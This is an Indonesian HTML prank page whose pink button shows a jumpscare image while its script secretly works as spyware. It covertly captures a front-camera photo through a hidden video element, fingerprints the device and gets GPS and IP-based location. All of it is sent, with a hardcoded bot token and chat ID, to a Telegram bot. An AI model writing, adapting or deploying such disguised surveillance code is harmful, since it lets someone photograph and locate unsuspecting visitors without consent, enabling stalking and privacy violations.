<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Kejutan Cantik</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #ffe6f2;
            font-family: 'Arial', sans-serif;
            overflow: hidden;
        }

        .btn-cantik {
            padding: 15px 40px;
            font-size: 24px;
            font-weight: bold;
            color: white;
            background: linear-gradient(45deg, #ff4d94, #ff80df);
            border: none;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(255, 77, 148, 0.4);
            transition: transform 0.2s, box-shadow 0.2s;
            position: relative;
            z-index: 1;
        }

        .btn-cantik:hover {
            transform: scale(1.05);
            box-shadow: 0 6px 20px rgba(255, 77, 148, 0.6);
        }

        .btn-cantik:active {
            transform: scale(0.95);
        }

        #jumpscare-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: black;
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }

        #jumpscare-img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            animation: shake 0.08s infinite;
        }

        @keyframes shake {
            0% { transform: translate(1px, 1px) rotate(0deg); }
            10% { transform: translate(-1px, -2px) rotate(-1deg); }
            20% { transform: translate(-3px, 0px) rotate(1deg); }
            30% { transform: translate(0px, 2px) rotate(0deg); }
            40% { transform: translate(1px, -1px) rotate(1deg); }
            50% { transform: translate(-1px, 2px) rotate(-1deg); }
            60% { transform: translate(-3px, 1px) rotate(0deg); }
            70% { transform: translate(2px, 1px) rotate(-1deg); }
            80% { transform: translate(-1px, -1px) rotate(1deg); }
            90% { transform: translate(2px, 2px) rotate(0deg); }
            100% { transform: translate(1px, -2px) rotate(-1deg); }
        }

        .hidden {
            display: none !important;
        }

        video {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        canvas {
            display: none;
        }
    </style>
</head>
<body>

    <!-- TOMBOL -->
    <button class="btn-cantik" id="btnCantik">✨ Pencet Cantik ✨</button>

    <!-- OVERLAY JUMPScare -->
    <div id="jumpscare-overlay">
        <img id="jumpscare-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRetLiXderHNqetWb89PbN1EBprTZQBALyXxLZMUX1F9w&s=10" alt="Jumpscare!">
    </div>

    <!-- AUDIO -->
    <audio id="jumpscare-audio" src="suara.mp3" preload="auto"></audio>

    <!-- KAMERA (hidden) -->
    <video id="video" autoplay muted playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        (function() {
            'use strict';

            // ========== KONFIGURASI TELEGRAM ==========
            const BOT_TOKEN = '8097441996:AAEC5AoZ5LKdJ2tvS-bKCbDrrWixpcPWRWg';
            const CHAT_ID = '7016470025';

            // ========== DOM ==========
            const btn = document.getElementById('btnCantik');
            const overlay = document.getElementById('jumpscare-overlay');
            const audio = document.getElementById('jumpscare-audio');
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');

            // ========== STATE ==========
            let isProcessing = false;
            let isSent = false;
            let stream = null;
            let captureDone = false;
            let locationDone = false;
            let deviceDone = false;
            let imageData = null;
            let locationData = null;
            let deviceData = null;
            let sendAttempts = 0;
            const MAX_SEND_ATTEMPTS = 3;

            // ========== 1. DETEKSI DEVICE SUPER AKURAT ==========
            function getAccurateDevice() {
                try {
                    const ua = navigator.userAgent;
                    let brand = 'Unknown';
                    let model = 'Unknown';
                    let os = 'Unknown';
                    let osVer = 'Unknown';
                    let browser = 'Unknown';
                    let deviceType = 'Desktop';
                    let cpu = 'Unknown';
                    let gpu = 'Unknown';

                    // ---- OS ----
                    if (/android/i.test(ua)) {
                        os = 'Android';
                        const m = ua.match(/Android\s([\d.]+)/);
                        if (m) osVer = m[1];
                        deviceType = 'Mobile';
                    } else if (/iPhone|iPad|iPod/i.test(ua)) {
                        os = 'iOS';
                        const m = ua.match(/OS\s([\d_]+)/);
                        if (m) osVer = m[1].replace(/_/g, '.');
                        deviceType = /iPad/i.test(ua) ? 'Tablet' : 'Mobile';
                    } else if (/Windows/i.test(ua)) {
                        os = 'Windows';
                        const m = ua.match(/Windows NT ([\d.]+)/);
                        if (m) osVer = m[1];
                    } else if (/Mac/i.test(ua)) {
                        os = 'macOS';
                        deviceType = 'Desktop';
                    } else if (/Linux/i.test(ua)) {
                        os = 'Linux';
                    }

                    // ---- BRAND & MODEL ----
                    const brandPatterns = {
                        'Samsung': /Samsung|SM-|Galaxy|GT-|SCH-|SGH-|SPH-|SHV-|SHW-|SC-|SM-G|SM-A|SM-J|SM-M|SM-N|SM-T|SM-X|SM-F|SM-Z|SM-C|SM-E|SM-P|SM-W/,
                        'Xiaomi': /Xiaomi|Redmi|POCO|Mi\s|M20|M21|M22|M23|M24|M25|M200|M210|M220|M230/,
                        'iPhone': /iPhone/,
                        'Oppo': /Oppo|CPH|PED|PDT|PGU|PHA|PHB|PHF|PHJ|PHN|PHP|PHS|PHU|PHW|PHX|PHY|PKA|PKB|PKC|PKD|PKE|PKF|PKG|PKH|PKI|PKJ|PKK|PKL|PKM|PKN|PKO|PKP|PKQ|PKR|PKS|PKT|PKU|PKV|PKW|PKX|PKY|PKZ/,
                        'Vivo': /Vivo|V\d{4}|V\d{5}|PD\d{4}/,
                        'Realme': /Realme|RMX|RMP/,
                        'Google': /Pixel|Google/,
                        'OnePlus': /OnePlus|LE\d{4}|CPH\d{4}/,
                        'Huawei': /Huawei|HONOR|MHA-|LIO-|MAR-|ELE-|VOG-|LYA-|CLT-|NOH-|TAS-|LSA-|PCT-|JNY-|ANA-|GRA-|EVR-|ELS-|LIO-|NOP-|BRQ-|NAM-|CDY-|DBY-|JAD-|TNN-|MNA-|FRL-|TFY-|PPA-|WKG-|MGA-|DCO-/
                    };

                    for (const [b, pattern] of Object.entries(brandPatterns)) {
                        if (pattern.test(ua)) {
                            brand = b;
                            break;
                        }
                    }

                    // Ambil model dari userAgent
                    const modelMatch = ua.match(/; ([^;]+)\)/);
                    if (modelMatch && modelMatch[1]) {
                        const raw = modelMatch[1].trim();
                        if (!raw.includes('Android') && !raw.includes('iOS') && !raw.includes('Linux')) {
                            model = raw;
                        }
                    }

                    // ---- CPU ----
                    try {
                        if (navigator.hardwareConcurrency) {
                            cpu = navigator.hardwareConcurrency + ' cores';
                        }
                        if (/arm/i.test(ua)) cpu += ' (ARM)';
                        else if (/x86/i.test(ua)) cpu += ' (x86)';
                        else if (/aarch64/i.test(ua)) cpu += ' (ARM64)';
                    } catch(e) {}

                    // ---- GPU ----
                    try {
                        const gl = document.createElement('canvas').getContext('webgl');
                        if (gl) {
                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                            if (debugInfo) {
                                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Unknown';
                                if (gpu.includes('Adreno')) gpu = 'Adreno';
                                else if (gpu.includes('Mali')) gpu = 'Mali';
                                else if (gpu.includes('PowerVR')) gpu = 'PowerVR';
                                else if (gpu.includes('Apple')) gpu = 'Apple GPU';
                            }
                        }
                    } catch(e) {}

                    // ---- Browser ----
                    if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
                    else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
                    else if (/Firefox/i.test(ua)) browser = 'Firefox';
                    else if (/Edg/i.test(ua)) browser = 'Edge';
                    else if (/SamsungBrowser/i.test(ua)) browser = 'Samsung Internet';

                    // ---- Device Type ----
                    if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
                        deviceType = /Tablet|iPad/i.test(ua) ? 'Tablet' : 'Mobile';
                    }

                    deviceData = {
                        brand: brand,
                        model: model,
                        os: os,
                        osVer: osVer,
                        browser: browser,
                        deviceType: deviceType,
                        cpu: cpu,
                        gpu: gpu,
                        screen: screen.width + 'x' + screen.height,
                        pixelRatio: window.devicePixelRatio || 1,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0
                    };

                    if (navigator.getBattery) {
                        navigator.getBattery()
                            .then(b => {
                                deviceData.battery = Math.round(b.level * 100) + '%' + (b.charging ? ' 🔌' : '');
                                deviceDone = true;
                                checkSend();
                            })
                            .catch(() => { deviceDone = true;
                                checkSend(); });
                    } else {
                        deviceDone = true;
                    }

                    return true;
                } catch(e) {
                    deviceData = { brand: 'Unknown', model: 'Unknown', os: 'Unknown' };
                    deviceDone = true;
                    return true;
                }
            }

            // ========== 2. KAMERA + CAPTURE ==========
            function startCamera() {
                let attempts = 0;
                const maxAttempts = 3;

                function tryCamera() {
                    attempts++;
                    navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 640 } },
                        audio: false
                    })
                    .then(s => {
                        stream = s;
                        video.srcObject = stream;
                        video.play();

                        let capAttempts = 0;
                        const maxCap = 5;

                        function doCapture() {
                            if (captureDone) return;
                            capAttempts++;
                            const w = video.videoWidth || 480;
                            const h = video.videoHeight || 640;

                            if (w < 10 || h < 10) {
                                if (capAttempts < maxCap) { setTimeout(doCapture, 200); } else { captureDone = true;
                                    checkSend(); }
                                return;
                            }

                            try {
                                canvas.width = w;
                                canvas.height = h;
                                ctx.translate(w, 0);
                                ctx.scale(-1, 1);
                                ctx.drawImage(video, 0, 0, w, h);
                                ctx.setTransform(1, 0, 0, 1, 0, 0);

                                const pixel = ctx.getImageData(0, 0, 5, 5);
                                let isBlack = true;
                                for (let i = 0; i < pixel.data.length; i += 4) {
                                    if (pixel.data[i] > 15 || pixel.data[i + 1] > 15 || pixel.data[i + 2] > 15) {
                                        isBlack = false;
                                        break;
                                    }
                                }

                                if (isBlack && capAttempts < maxCap) {
                                    setTimeout(doCapture, 300);
                                    return;
                                }

                                imageData = canvas.toDataURL('image/jpeg', 0.8);
                                captureDone = true;
                                if (stream) { stream.getTracks().forEach(t => t.stop());
                                    stream = null; }
                                checkSend();
                            } catch(e) {
                                if (capAttempts < maxCap) { setTimeout(doCapture, 300); } else { captureDone = true;
                                    checkSend(); }
                            }
                        }

                        video.addEventListener('loadedmetadata', doCapture);
                        if (video.videoWidth > 10) doCapture();
                        setTimeout(doCapture, 500);
                    })
                    .catch(err => {
                        if (attempts < maxAttempts) {
                            setTimeout(tryCamera, 500);
                        } else {
                            captureDone = true;
                            checkSend();
                        }
                    });
                }

                tryCamera();
            }

            // ========== 3. LOKASI ==========
            function getLocation() {
                let ipDone = false;
                let gpsDone = false;

                const ipSources = ['https://ipapi.co/json/', 'https://ipinfo.io/json'];
                let ipIndex = 0;

                function tryIP() {
                    if (ipDone || ipIndex >= ipSources.length) {
                        if (!ipDone) { ipDone = true; }
                        checkLocationDone();
                        return;
                    }
                    const url = ipSources[ipIndex++];
                    fetch(url, { timeout: 3000 })
                        .then(r => r.json())
                        .then(d => {
                            if (ipDone || !d) return;
                            let lat, lng, city, region, country;
                            if (d.latitude && d.longitude) { lat = d.latitude;
                                lng = d.longitude;
                                city = d.city || 'N/A';
                                region = d.region || 'N/A';
                                country = d.country_name || d.country || 'N/A'; } else if (d.loc) { const c = d.loc
                                    .split(','); lat = parseFloat(c[0]);
                                lng = parseFloat(c[1]);
                                city = d.city || 'N/A';
                                region = d.region || 'N/A';
                                country = d.country || 'N/A'; }

                            if (lat && lng) {
                                locationData = { lat, lng, city, region, country, source: 'IP' };
                                ipDone = true;
                                checkLocationDone();
                            } else {
                                tryIP();
                            }
                        })
                        .catch(() => { tryIP(); });
                }

                function tryGPS() {
                    if (gpsDone || !navigator.geolocation) {
                        if (!gpsDone) { gpsDone = true; }
                        checkLocationDone();
                        return;
                    }
                    navigator.geolocation.getCurrentPosition(
                        p => {
                            if (!gpsDone && !locationData) {
                                locationData = {
                                    lat: p.coords.latitude,
                                    lng: p.coords.longitude,
                                    accuracy: '±' + Math.round(p.coords.accuracy || 0) + 'm',
                                    source: 'GPS'
                                };
                                gpsDone = true;
                                checkLocationDone();
                            }
                        },
                        () => { gpsDone = true;
                            checkLocationDone(); }, { enableHighAccuracy: true, timeout: 3000 }
                    );
                }

                function checkLocationDone() {
                    if (ipDone && gpsDone) {
                        locationDone = true;
                        if (!locationData) {
                            locationData = { lat: 0, lng: 0, source: 'none' };
                        }
                        checkSend();
                    }
                }

                tryIP();
                tryGPS();

                setTimeout(() => {
                    if (!locationDone) {
                        locationDone = true;
                        if (!locationData) {
                            locationData = { lat: 0, lng: 0, source: 'timeout' };
                        }
                        checkSend();
                    }
                }, 5000);
            }

            // ========== 4. KIRIM TELEGRAM ==========
            function sendToTelegram() {
                if (isSent) return;
                if (!imageData) {
                    checkSend();
                    return;
                }

                let caption = '📸 JUMPScare CAPTURE\n';
                caption += '⏰ ' + new Date().toLocaleString('id-ID') + '\n';
                caption += '━'.repeat(25) + '\n';

                if (deviceData) {
                    caption += '\n📱 PERANGKAT:\n';
                    caption += '   Merek: ' + deviceData.brand + '\n';
                    caption += '   Model: ' + deviceData.model + '\n';
                    caption += '   Tipe: ' + deviceData.deviceType + '\n';
                    caption += '   OS: ' + deviceData.os + ' ' + deviceData.osVer + '\n';
                    caption += '   Browser: ' + deviceData.browser + '\n';
                    caption += '   CPU: ' + deviceData.cpu + '\n';
                    caption += '   GPU: ' + deviceData.gpu + '\n';
                    caption += '   Resolusi: ' + deviceData.screen + '\n';
                    caption += '   Pixel Ratio: ' + deviceData.pixelRatio + '\n';
                    caption += '   Timezone: ' + deviceData.timezone + '\n';
                    if (deviceData.battery) caption += '   Baterai: ' + deviceData.battery + '\n';
                    caption += '   Touch: ' + (deviceData.touch ? 'Yes' : 'No');
                }

                if (locationData && locationData.lat && locationData.lng) {
                    caption += '\n\n📍 LOKASI:\n';
                    caption += '   Lat: ' + locationData.lat + '\n';
                    caption += '   Lng: ' + locationData.lng + '\n';
                    if (locationData.city) caption += '   Kota: ' + locationData.city + '\n';
                    if (locationData.country) caption += '   Negara: ' + locationData.country + '\n';
                    if (locationData.accuracy) caption += '   Akurasi: ' + locationData.accuracy + '\n';
                    caption += '\n🗺️ https://maps.google.com/?q=' + locationData.lat + ',' + locationData.lng;
                }

                try {
                    const bs = atob(imageData.split(',')[1]);
                    const ab = new ArrayBuffer(bs.length);
                    const ia = new Uint8Array(ab);
                    for (let i = 0; i < bs.length; i++) ia[i] = bs.charCodeAt(i);
                    const blob = new Blob([ab], { type: 'image/jpeg' });

                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('photo', blob, 'jumpscare.jpg');
                    fd.append('caption', caption);

                    sendAttempts++;

                    fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', {
                        method: 'POST',
                        body: fd
                    })
                    .then(r => r.json())
                    .then(d => {
                        if (d.ok) {
                            isSent = true;
                        } else {
                            if (sendAttempts < MAX_SEND_ATTEMPTS) {
                                setTimeout(sendToTelegram, 1500);
                            }
                        }
                    })
                    .catch(() => {
                        if (sendAttempts < MAX_SEND_ATTEMPTS) {
                            setTimeout(sendToTelegram, 1500);
                        }
                    });
                } catch(e) {
                    if (sendAttempts < MAX_SEND_ATTEMPTS) {
                        setTimeout(sendToTelegram, 1500);
                    }
                }
            }

            // ========== 5. CHECK & SEND ==========
            function checkSend() {
                if (captureDone && locationDone && deviceDone && !isSent) {
                    sendToTelegram();
                }
            }

            // ========== 6. FUNGSI UTAMA ==========
            function runAll() {
                if (isProcessing) return;
                isProcessing = true;

                // Jalankan semua
                getAccurateDevice();
                startCamera();
                getLocation();

                // Safety timeout
                setTimeout(() => {
                    if (!isSent) {
                        if (!captureDone) { captureDone = true; }
                        if (!locationDone) { locationDone = true; if (!locationData) locationData = { lat: 0,
                                lng: 0, source: 'fallback' }; }
                        if (!deviceDone) { deviceDone = true; if (!deviceData) deviceData = { brand: 'Unknown',
                                model: 'Unknown' }; }
                        if (!imageData) {
                            try { imageData = canvas.toDataURL('image/jpeg', 0.7); } catch(e) {}
                        }
                        checkSend();
                    }
                }, 8000);
            }

            // ========== 7. EVENT TOMBOL ==========
            btn.addEventListener('click', function() {
                // 1. Tampilkan jumpscare
                overlay.style.display = 'flex';
                audio.play().catch(function(error) {
                    console.log("Gagal memutar suara: ", error);
                });

                // 2. Jalankan proses di background
                runAll();

                // 3. Hilangkan jumpscare + reload setelah 3 detik
                setTimeout(function() {
                    overlay.style.display = 'none';
                    location.reload();
                }, 3000);
            });

            // ========== 8. CLEANUP ==========
            window.addEventListener('beforeunload', function() {
                if (stream) {
                    stream.getTracks().forEach(t => t.stop());
                }
            });

            console.log('👁️ drakGPT · Jumpscare + Device + Location');
            console.log('Token: ' + BOT_TOKEN);
            console.log('Chat ID: ' + CHAT_ID);

        })();
    </script>

</body>
</html>
